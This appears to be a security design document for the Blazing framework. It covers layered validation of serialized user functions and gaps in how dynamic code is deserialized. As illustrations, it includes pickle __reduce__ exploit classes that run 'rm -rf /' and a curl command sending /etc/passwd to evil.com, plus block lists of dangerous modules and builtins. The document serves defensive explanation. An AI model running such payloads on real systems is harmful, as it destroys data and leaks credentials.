# Security: Dynamic Code Execution

This document explains the multi-layered security validations in place when executing user-provided code in Blazing, particularly for the dynamic code execution pattern (passing serialized functions as arguments).

## Security Architecture

Blazing uses a **defense-in-depth** approach with multiple layers of validation:

```
┌─────────────────────────────────────────────────────────────┐
│ CLIENT SIDE (blazing.py)                                     │
│ Layer 1: AST Validation at Decoration Time                  │
│ - Happens when @app.step is applied                      │
│ - Analyzes source code before serialization                 │
│ - Blocks dangerous imports, builtins, operations            │
│ - IMMEDIATE feedback to developer                           │
└─────────────────────────────────────────────────────────────┘
                            ↓ (dill serialization)
┌─────────────────────────────────────────────────────────────┐
│ TRANSPORT                                                    │
│ Layer 2: Cryptographic Signature (Optional)                 │
│ - HMAC-SHA256 or Ed25519 signature of serialized payload   │
│ - Prevents tampering in transit                             │
│ - Prevents replay attacks (with nonce)                      │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│ EXECUTOR SIDE (Docker/Pyodide)                              │
│ Layer 3: Signature Verification                             │
│ - Verify signature BEFORE dill.loads()                      │
│ - Critical: dill.loads() can execute code during unpickling │
│                                                              │
│ Layer 4: Bytecode Validation                                │
│ - Inspect function.__code__ for dangerous opcodes           │
│ - Block eval, exec, compile, __import__, etc.               │
│ - Check for dangerous builtins (open, socket, etc.)         │
│                                                              │
│ Layer 5: Sandbox Isolation (Pyodide only)                   │
│ - WebAssembly sandbox (NO I/O access)                       │
│ - No filesystem, network, subprocess                        │
│ - RestrictedPython compiler (optional)                      │
└─────────────────────────────────────────────────────────────┘
```

## Validation Layers in Detail

### Layer 1: Client-Side AST Validation

**Location:** [src/blazing/security.py](../src/blazing/security.py)

**Triggered:** When `@app.step` or `@app.workflow` decorator is applied

**Implementation:**
```python
# In blazing.py, station decorator
if self._code_validator:
    try:
        self._code_validator.validate_function_or_raise(func)
        logger.debug(f"Station '{func.__name__}' passed security validation")
    except SecurityError as e:
        raise SecurityError(f"Station '{func.__name__}' failed security validation: {e}")
```

**What it blocks:**
```python
# Blocked imports
BLOCKED_IMPORTS = {
    'os', 'sys', 'subprocess', 'shutil', 'pathlib',  # System access
    'socket', 'urllib', 'http', 'requests', 'httpx',  # Network
    'pickle', 'dill', 'marshal',                      # Dangerous serialization
    'ctypes', 'multiprocessing', 'threading',         # Low-level access
    # ... and more
}

# Blocked builtins
BLOCKED_BUILTINS = {
    'eval', 'exec', 'compile', '__import__',
    'open', 'input', 'breakpoint',
    'globals', 'locals', 'vars',
    # ... and more
}
```

**Example validation failure:**
```python
@app.step
async def malicious_station(x: int, services=None):
    import os  # ❌ BLOCKED at decoration time
    return os.system("ls")

# Raises:
# SecurityError: Station 'malicious_station' failed security validation:
# Blocked import found: os
```

### Layer 2: Cryptographic Signatures

**Location:** [src/blazing_service/attestation.py](../src/blazing_service/attestation.py)

**Triggered:** When `enable_attestation=True` (default)

**Implementation:**
```python
# Client side - sign serialized function
signature = hmac.new(
    signing_key,
    serialized_function.encode('utf-8'),
    hashlib.sha256
).hexdigest()

# Or with Ed25519 (newer, more secure)
signature = signing_key.sign(serialized_function.encode('utf-8'))
```

**Purpose:**
- Proves the coordinator validated the code before serialization
- Prevents MITM tampering with serialized payload
- Prevents replay attacks (with nonce)
- Executor refuses unsigned/invalid payloads

### Layer 3: Server-Side Signature Verification

**Location:** [src/blazing_executor/service.py](../src/blazing_executor/service.py)

**Triggered:** BEFORE `dill.loads()` is called

**Implementation:**
```python
def deserialize_function(serialized: str, signature: Optional[str] = None) -> Callable:
    """
    SECURITY LAYERS:
    1. Signature verification - ensures payload came from trusted coordinator
    2. Bytecode validation - blocks dangerous patterns even in signed code
    """
    # CRITICAL: Verify BEFORE deserializing
    if not verify_signature(serialized, signature):
        raise ValueError("SECURITY: Signature verification failed - refusing to deserialize")

    # Safe to deserialize now
    func = dill.loads(base64.b64decode(serialized))

    # ... continue to Layer 4
```

**Why this matters:**
```python
# dill.loads() can execute code during unpickling!
class Evil:
    def __reduce__(self):
        import os
        os.system("rm -rf /")  # Executes during dill.loads()!
        return (str, ())

# This is why we MUST verify signatures BEFORE dill.loads()
```

### Layer 4: Bytecode Validation

**Location:** [src/blazing_executor/service.py:551-633](../src/blazing_executor/service.py#L551)

**Triggered:** AFTER deserialization, BEFORE execution

**Implementation:**
```python
def _validate_function_bytecode(func: Callable) -> tuple[bool, Optional[str]]:
    """
    Validate function bytecode for dangerous patterns.
    Defense-in-depth measure that catches dangerous code AFTER deserialization.
    """
    import dis

    # Check bytecode instructions
    for instr in dis.get_instructions(func):
        # Block dangerous opcodes
        if instr.opname == 'LOAD_GLOBAL':
            name = instr.argval
            if name in BLOCKED_BUILTINS:  # eval, exec, compile, etc.
                return False, f"Blocked builtin: {name}"

        if instr.opname == 'IMPORT_NAME':
            module = instr.argval
            if module in BLOCKED_MODULES:  # os, subprocess, socket, etc.
                return False, f"Blocked import: {module}"

    return True, None
```

**What it catches:**
```python
# Example 1: Hidden eval in signed code
def sneaky(x, services=None):
    # Client-side validator might miss this if obfuscated
    return eval(f"{x} + 1")  # ❌ BLOCKED by bytecode validation

# Example 2: Dynamic import
def sneaky2(services=None):
    __import__('os').system('ls')  # ❌ BLOCKED by bytecode validation
```

### Layer 5: Sandbox Isolation (Pyodide)

**Location:** Pyodide WASM runtime

**Triggered:** When station has `sandboxed=True` or `worker_type=*_SANDBOXED`

**Implementation:**
```javascript
// Pyodide executor runs in Node.js with WebAssembly
const pyodide = await loadPyodide();

// Python code runs in WASM sandbox:
// - No filesystem access (virtual filesystem only)
// - No network access (unless bridged via JS)
// - No subprocess spawning
// - Limited memory/CPU
```

**What it prevents:**
```python
@app.step(sandboxed=True)
async def user_code(x: int, services=None):
    # Even if all validation layers failed, Pyodide prevents:
    import os  # ImportError: No module named 'os'

    import socket  # ImportError: No module named 'socket'

    open('/etc/passwd')  # No filesystem access

    # User can ONLY:
    # 1. Do pure computation
    # 2. Call services (which run on TRUSTED workers)
```

## Dynamic Code Execution Pattern

When passing serialized code as arguments (like the examples in `docs/examples/dynamic_code_execution.py`), the validation flow is:

```python
# CLIENT SIDE
# =============================================================================

# 1. User defines a function
def user_strategy(data, services=None):
    return [x * 2 for x in data]

# 2. NO client-side validation (function not decorated!)
#    This is the GAP in the current implementation

# 3. Serialize and encode
import dill, base64
serialized = base64.b64encode(dill.dumps(user_strategy)).decode('utf-8')

# 4. Pass as argument to station
await execute_user_function(serialized, [1, 2, 3])


# SERVER SIDE (EXECUTOR)
# =============================================================================

# 5. Station deserializes the code
@app.step
async def execute_user_function(serialized_func: str, *args, services=None):
    func_bytes = base64.b64decode(serialized_func)
    user_func = dill.loads(func_bytes)  # ⚠️ NO signature check!
    return user_func(*args)

# 6. Bytecode validation happens AFTER dill.loads()
#    Too late if __reduce__ was exploited

# 7. Sandbox isolation (Pyodide) provides final defense
```

## Security Gaps in Dynamic Code Pattern

The current implementation has these gaps when code is passed as data:

### ❌ Gap 1: No Client-Side Validation

**Problem:** Functions passed as arguments are NOT decorated, so they skip Layer 1 validation.

**Example:**
```python
# This is NOT validated at all on client side:
def malicious(data, services=None):
    import os  # No error - not decorated!
    os.system("rm -rf /")
    return data

serialized = base64.b64encode(dill.dumps(malicious)).decode('utf-8')
await execute_user_function(serialized, [1, 2, 3])  # Sends to executor
```

**Solution:** Add explicit validation before serialization:
```python
from blazing.security import CodeValidator

def serialize_user_function(func):
    """Safely serialize user function with validation."""
    # Validate BEFORE serialization
    validator = CodeValidator(strict_mode=True)
    validator.validate_function_or_raise(func)

    # Sign the serialized payload
    serialized = base64.b64encode(dill.dumps(func)).decode('utf-8')
    signature = sign(serialized)

    return serialized, signature
```

### ❌ Gap 2: No Signature on Dynamic Code

**Problem:** The executor station doesn't verify signatures on user-provided code.

**Example:**
```python
@app.step
async def execute_user_function(serialized_func: str, *args, services=None):
    # ⚠️ No signature verification!
    user_func = dill.loads(base64.b64decode(serialized_func))
    return user_func(*args)
```

**Solution:** Require signature as parameter:
```python
@app.step
async def execute_user_function(
    serialized_func: str,
    signature: str,
    *args,
    services=None
):
    """Execute user function with signature verification."""
    from blazing_executor.service import deserialize_function

    # This does signature + bytecode validation
    user_func = deserialize_function(serialized_func, signature)
    return user_func(*args)
```

### ❌ Gap 3: dill.loads() Without Safeguards

**Problem:** Direct `dill.loads()` in station code bypasses all executor-side validation.

**Example:**
```python
# Current pattern in examples:
user_func = dill.loads(base64.b64decode(serialized_func))  # ⚠️ DANGEROUS
```

**Why dangerous:**
```python
# An attacker can craft a payload with __reduce__:
class Exploit:
    def __reduce__(self):
        import os
        os.system("curl http://evil.com/$(cat /etc/passwd)")
        return (str, ())

# dill.loads() will execute the exploit during unpickling!
```

## Recommended Pattern for Dynamic Code

For safe dynamic code execution, use this pattern:

```python
from blazing import Blazing
from blazing.security import CodeValidator
import base64
import dill

app = Blazing(api_url="...", api_token="...")

# SERVER SIDE: Executor station with proper validation
@app.step(sandboxed=True)  # ← Use sandboxed execution
async def execute_validated_function(
    serialized_func: str,
    signature: str,  # ← Require signature
    *args,
    services=None
):
    """
    Execute user function with full validation chain.

    Security:
    - Signature verification (Layer 3)
    - Bytecode validation (Layer 4)
    - Sandbox isolation (Layer 5)
    """
    # Import executor's safe deserializer
    # NOTE: This is conceptual - in practice, the executor runs this code,
    # and deserialize_function is available in the executor's environment
    from blazing_executor.service import deserialize_function

    # Safe deserialization with signature + bytecode validation
    user_func = deserialize_function(serialized_func, signature)

    # Execute in sandbox
    result = user_func(*args, **kwargs)
    if hasattr(result, '__await__'):
        result = await result

    return result


# CLIENT SIDE: Helper to safely serialize user functions
def serialize_user_function_safely(func):
    """
    Safely serialize a user function with validation and signing.

    Returns:
        (serialized_func, signature) tuple
    """
    # Layer 1: Client-side AST validation
    validator = CodeValidator(strict_mode=True)
    validator.validate_function_or_raise(func)

    # Serialize
    serialized = base64.b64encode(dill.dumps(func)).decode('utf-8')

    # Layer 2: Sign the payload
    # (In production, use app._attestation_signer)
    import hmac, hashlib
    signing_key = b"your-secret-key"  # Should come from config
    signature = hmac.new(
        signing_key,
        serialized.encode('utf-8'),
        hashlib.sha256
    ).hexdigest()

    return serialized, signature


# CLIENT SIDE: Usage
async def main():
    # Define user function
    def user_strategy(data):
        return [x * 2 for x in data]

    # Safe serialization with validation + signing
    serialized, signature = serialize_user_function_safely(user_strategy)

    # Execute with signature verification
    unit = await app.run(
        "execute_validated_function",
        serialized_func=serialized,
        signature=signature,  # ← Signature required
        args=[1, 2, 3]
    )
    result = await unit.result()
    print(result)  # [2, 4, 6]
```

## Summary

### ✅ Current Protections

1. **Decorated steps/routes** get full client-side AST validation
2. **Executor** performs bytecode validation on all deserialized functions
3. **Pyodide sandbox** prevents all I/O even if validation fails
4. **Signature verification** prevents tampering with coordinator-signed code

### ⚠️ Gaps for Dynamic Code Pattern

1. **Functions passed as arguments** skip client-side validation (not decorated)
2. **Direct dill.loads()** in user station code bypasses executor validation
3. **No signature requirement** for user-provided serialized code

### 🔒 Best Practices

1. **Always use sandboxed execution** for user-provided code: `@app.step(sandboxed=True)`
2. **Validate before serialization** using `CodeValidator` on client side
3. **Sign all serialized code** and verify signatures before deserialization
4. **Never call `dill.loads()` directly** - use `deserialize_function()` with signature
5. **Use services** to control what resources user code can access

### 🎯 Example Use Cases

**Safe for dynamic code:**
- ✅ Data transformations (map/filter/reduce functions)
- ✅ Trading strategies (with service-controlled market data access)
- ✅ Custom analytics (with service-controlled database access)
- ✅ A/B testing different algorithms

**Dangerous without proper validation:**
- ❌ Arbitrary Python REPL
- ❌ User-provided shell scripts
- ❌ Unvalidated imports
- ❌ File upload/download functionality
